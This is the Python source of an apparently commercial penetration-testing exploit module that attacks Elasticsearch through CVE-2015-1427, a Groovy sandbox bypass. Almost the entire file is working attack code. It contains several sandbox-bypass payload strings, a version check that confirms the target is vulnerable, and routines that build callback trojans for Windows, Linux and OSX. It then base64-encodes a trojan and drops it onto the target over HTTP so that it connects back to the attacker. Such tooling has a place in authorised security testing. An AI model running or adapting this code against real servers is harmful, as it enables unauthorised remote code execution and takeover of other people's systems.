# -*- coding: utf-8 -*-
#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path: sys.path.append(".")

import os
import re
import time
import json
import socket
import base64
import shutil
import exploitutils
import canvasengine

from cStringIO import StringIO
from libs import spkproxy
from tcpexploit import tcpexploit
from libs.canvasos import *
from contextlib import contextmanager


NAME                           = "elasticsearch_CVE-2015-1427"
DESCRIPTION                    = "Elasticsearch RCE (Groovy Sandbox Bypass) - CVE-2015-1427"
VERSION                        = "1.0"
NOTES                          = """Notes"""
GTK2_DIALOG                    = "dialog.glade2"

DOCUMENTATION                  = {}
DOCUMENTATION["Notes"]         = """
Elasticsearch versions 1.3.x before 1.3.8 and 1.4.x before 1.4.3 have dynamic scripting
features enabled by default using Groovy as scripting language.
There is a Groovy sandbox bypass that can be used to obtain Groovy Remote Code Execution.

Elasticsearch version 1.4.3 disabled dynamic scripting by default and improved the Groovy
sandbox by including certain methods to its blacklist check.

However Immunity uncovered that for versions 1.4.3 and greater there are still other bypasses to the Groovy sandbox if dynamic
scripts are manually enabled on the configuration file config/elasticsearch.yml by adding
the following lines:
script.inline: sandbox
script.groovy.sandbox.enabled: true

"""

DOCUMENTATION['VENDOR']        = "elastic"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION['CVE Name']      = 'CVE-2015-1427'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-1427'
DOCUMENTATION["References"]    = """http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/"""

PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['ARCH']               = [ ["Linux" ] , ["Windows"], ["OSX"] ]
PROPERTY['VERSION']            = [ "All" ]


TIMEOUT = 10

@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.host               = ''
        self.hostname           = ''
        self.port               = 9200 # default elasticsearch port
        self.path               = ''
        self.ssl                = False
        self.base_url           = ""
        self.respath            = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.tmppath            = None
        self.mosdef_type        = "UNIVERSAL" # | HTTP | DNS
        self.dns_domain         = None
        self.http_ssl           = False
        self.trojan_filename    = exploitutils.randomstring(8)
        self.remote_tmp_dir     = ""
        self.remote_os_info     = ["linux", "X64"] # [os_name, os_arch] - assuming linux x64 by default
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.es_version         = ['0', '0', '0']

        self.bypasses_payloads  = [
            {"getClass" : 'java.lang.Math.class.forName(\\"[CLASSNAME]\\")'}, # only works for elasticsearch  1.3.x before 1.3.8 and 1.4.x before 1.4.3
            {"getClass" : 'groovy.util.GroovyCollections.class.getClassLoader().loadClass(\\"[CLASSNAME]\\")'}, # works for all versions up to latest 1.5.2 if dynamic scripting is enabled
            {"getClass" : 'java.lang.Math.class.getSuperclass().cast(java.lang.Class).getMethod(\\"forName\\", java.lang.String).invoke(null,\\"[CLASSNAME]\\")'}, # works for all versions up to latest 1.5.2 if dynamic scripting is enabled
        ]
        self.working_bypass = -1
        self.getclass_regex = re.compile("\[GETCLASS_(.*)\]")

        self.setInfo(DESCRIPTION)

    def neededListenerTypes(self):
        self.getargs()
        if self.mosdef_type == "DNS":
            return [canvasengine.DNSMOSDEF]
        elif self.mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """

        self.getarg("host")
        self.getarg("hostname")
        self.getarg("port")
        self.getarg("path")
        self.getarg("dns_domain")

        if not self.path.startswith("/"): self.path = "/" + self.path

        self.ssl                = self.getarg("ssl")
        self.basicauth_user     = self.argsDict.get("username", self.basicauth_user)
        self.basicauth_password = self.argsDict.get("password", self.basicauth_password)
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

    def setup_UA(self, url):
        """
        Setup everything needed to do requests using spkproxy
        """
        if self.basicauth_user and self.basicauth_password:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
            self.log_info("Using BasicAuth (User: %s - Password: %s)" % (self.basicauth_user, self.basicauth_password))
        else:
            auth = None

        ua = spkproxy.UserAgent(url, auth=auth, hostname=self.hostname, exploit=self)
        return ua

    def _setup_args(self):
        self.getargs()

        if not self.host: self.host = self.target.interface
        if not self.hostname: self.hostname = self.host
        if not self.dns_domain: self.dns_domain = "%s.%s" % (self.name, self.host)

        # build url protocol://hostname:port + path
        protocol = "https" if self.ssl else "http"
        self.base_url = "%s://%s:%s/%s" % (protocol, self.hostname, self.port, self.path.lstrip("/"))

    def ensure_dynamic_scripting(self):
        """
        For some reason it looks like Groovy dynamic scripts are enabled by default but
        it doesn't work correctly unless you force it to index some local script.
        By testing we found out that issuing a simple request we can make that happen.
        We run this just in case to make sure the target will in fact run scripts
        """
        # the request would be something like:
        # curl -XPOST http://localhost:9200/_scripts/groovy/dummy -d '{ "script": "print \"dummy\"" }'
        scriptname = exploitutils.randomstring(8)
        ua = self.setup_UA("%s/_scripts/groovy/%s" % (self.base_url, scriptname))
        #XXX: this could be probably improved by checking the response code or text
        response = ua.POST("", '{ "script": "print \\"%s\\"" }' % scriptname)

    def test(self):
        """
        Check Elasticsearch version to determine if vulnerable
        """
        self._setup_args()
        ua = self.setup_UA(self.base_url)
        # a request to the root of the elasticsearch instance shold spit some json output containing the version
        response = ua.GET("")
        try:
            json_response = json.loads(response)
            self.es_version = json_response['version']['number'].split('.')
        except Exception:
            return 0 # some error happened parsing the version out of response

        # if version is greater than 1.3.0 we give it a go!
        if int(self.es_version[0]) == 1 and int(self.es_version[1]) >= 3:
            self.ensure_dynamic_scripting()
            # determine which bypass to use
            payload = "[GETCLASS_sun.misc.Unsafe]"
            for x in xrange(0, len(self.bypasses_payloads)):
                self.working_bypass = x
                response = self.remote_exec_groovy(payload)
                #self.debuglog("test response = %s" % response)
                if response.strip() == "class sun.misc.Unsafe":
                    self.log_info("Target is vulnerable! Proceeding with the attack")
                    return 1 # proved to be vulnerable

        self.log_info("Target does not appear to be vulnerable")
        return 0 # not vulnerable

    def run(self):
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.hostname, self.port))
        self._setup_args()

        self.tmppath = self.engine.create_new_session_output_dir(self.host, 'temp_files')

        self.nlog("Attacking %s:%d" % (self.hostname, self.port))

        if not self.get_remote_info():
            return self._exit(success=False)

        if not self.build_trojans():
            return self._exit(success=False)

        # now we are ready to run the dropper groovy payload that will then
        # execute the mosdef trojan on the target
        self.run_dropper()

        # give it a sec before checking if connectback was successful
        time.sleep(1)

        if self.ISucceeded():
            return self._exit(success=True)
        else:
            return self._exit(success=False)

    def get_remote_info(self):
        payload = ""
        template_path = os.path.join(self.respath, "remote_info_payload_template.txt")
        with open(template_path, 'r') as f:
            payload = f.read()
        remote_info = self.remote_exec_groovy(payload)

        self.debuglog("remote_info = %s" % remote_info)

        if remote_info is not None:
            self.remote_tmp_dir = remote_info[0].rstrip("/")
            self.remote_os_info = remote_info[1:]
            self.log_info("Target remote information:")
            self.log_info("tmp dir = %s" % self.remote_tmp_dir)
            self.log_info("OS = %s" % self.remote_os_info)

            if "mac" in self.remote_os_info[0].lower():
                self.remote_os_info[0] = "osx"

            self.remote_os_info[1] = "X64" if "64" in self.remote_os_info[1] else "X86"

            if self.remote_os_info[0].lower() == "windows":
                self.trojan_filename += ".exe"

            if self.remote_os_info[0].lower() == "linux" and self.mosdef_type == "DNS" :
                self.log_info("Warning: DNS MOSDEF callback is not available for Linux yet. Please choose a different type since DNS will fail to execute in this case")
                return False
            else:
                return True
        else:
            False

    def run_dropper(self):
        payload = ""
        template_path = os.path.join(self.respath, "dropper_payload_template.txt")
        with open(template_path, 'r') as f:
            payload = f.read()

        # populate the payload template
        payload = payload.replace("[TMPDIR]", self.remote_tmp_dir)
        payload = payload.replace("[RANDOM_FILENAME]", self.trojan_filename)
        output = StringIO()
        mosdef_trojan_path = os.path.join(self.tmppath,
                                          "callback_%s_%s.exe" % (self.remote_os_info[0].lower() , self.remote_os_info[1]))
        self.debuglog("encoding MOSDEF trojan binary with base64 (path = %s)" % mosdef_trojan_path)
        with open(mosdef_trojan_path, 'rb') as f:
            base64.encode(f, output)
        payload = payload.replace("[BASE64_PAYLOAD_DATA]", output.getvalue())
        output.close()

        response = self.remote_exec_groovy(payload)

    def remote_exec_groovy(self, payload):
        real_payload = self.getclass_regex.sub(self.bypasses_payloads[self.working_bypass]['getClass'].replace("[CLASSNAME]", r'\1'), payload)
        # remove all \n from payload
        real_payload = real_payload.replace("\n", "")
        real_payload = real_payload.replace("\r", "")

        ua = self.setup_UA("%s/%s" % (self.base_url, "_search?pretty&size=1"))
        data = '{"script_fields": {"IMMScript": {"script": "[PAYLOAD]", "lang":"groovy"}}}'.replace('[PAYLOAD]', real_payload)
        self.debuglog("POST data = %s" % data)
        response = ua.POST("", data)
        self.debuglog("POST response = %s" % response)
        try:
            json_response = json.loads(response)
            if 'hits' in json_response:
                return json_response['hits']['hits'][0]['fields']['IMMScript'][0]
            else:
                return json_response['error']
        except Exception, e:
            self.debuglog("Exception while trying to decode json response from server\n%s" % str(e))
            return None

    def clean_temp_resources(self):
        """
        Cleanup any local temp file created during exploit execution.
        """
        self.nlog("Cleaning local temp files")
        delete_files = []

        for p in ("linux", "windows", "osx"):
            for a in ("X86", "X64"):
                delete_files.append(os.path.join(self.tmppath, "callback_%s_%s.exe") % (p, a))

        for f in delete_files:
            try:
                os.remove(f)
            except Exception:
                pass

    def build_trojans(self):
        """
        Builds mosdef two trojans (x86 & x64) according to the selected mosdef type.
        These two trojans are later used for the dropper payload
        """
        msg = "Building MOSDEF trojans (type: %s - Callback ip: %s)" % (self.mosdef_type, str(self.callback.ip))
        #msg += " - SSL = %s)" % str(self.http_ssl) if self.mosdef_type == "HTTP" else ")"
        self.nlog(msg)
        if self.mosdef_type == "UNIVERSAL":
            return self.build_universal_trojans()
        elif self.mosdef_type == "HTTP":
            return self.build_universal_trojans(http=True, ssl=self.http_ssl)
        else:
            return self.build_dns_trojans()

    def build_dns_trojans(self):
        self.nlog("Warning: MOSDEF DNS is only available for Windows targets. "
                  "If your target is a Linux host the exploit won't work")
        filename = os.path.join(self.tmppath, "callback_windows_X86.exe")
        trojanmod = self.engine.getModuleExploit("BuildDNSCallback")
        trojanmod.link(self)
        trojanmod.argsDict["proxyaddr"] = self.callback.ip
        trojanmod.argsDict["domain"]    = self.dns_domain
        trojanmod.argsDict["filename"]  = filename
        ret = trojanmod.run()
        #XXX: DNS mosdef is still not available for 64bits, so just to make it work
        # for now, we make a copy of the x86 binary to have the x64 callback file
        if ret:
            try:
                shutil.copyfile(filename, filename.replace("X86", "X64"))
            except IOError:
                ret = 0
        return ret

    def build_universal_trojans(self, http=False, ssl=False):
        res = True
        platform = self.remote_os_info[0].upper() if self.remote_os_info[0].lower() == "osx" else self.remote_os_info[0].capitalize()
        arch = self.remote_os_info[1]
        self.nlog("Creating MOSDEF Trojans for Platform: %s - Architecture: %s (IP: %s and Port: %s)" % (platform, arch, str(self.callback.ip), str(self.callback.port)))

        t_os = canvasos(platform)
        t_os.arch = arch
        try:
            ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                         target_os=t_os, universal=True,
                                         http=http, ssl=ssl)
            if ret:
                filename = os.path.join(self.tmppath, "callback_%s_%s.exe" % (platform.lower(), arch))
                with open(filename,"wb") as f:
                    f.write(self.mosdeftrojan)
        except Exception, err:
            self.log_error("An error occurred while building MOSDEF trojan: %s" % str(err))
            res = False

        return res

    def _exit(self, success=True):
        self.clean_temp_resources()
        if success:
            self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            return 0


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
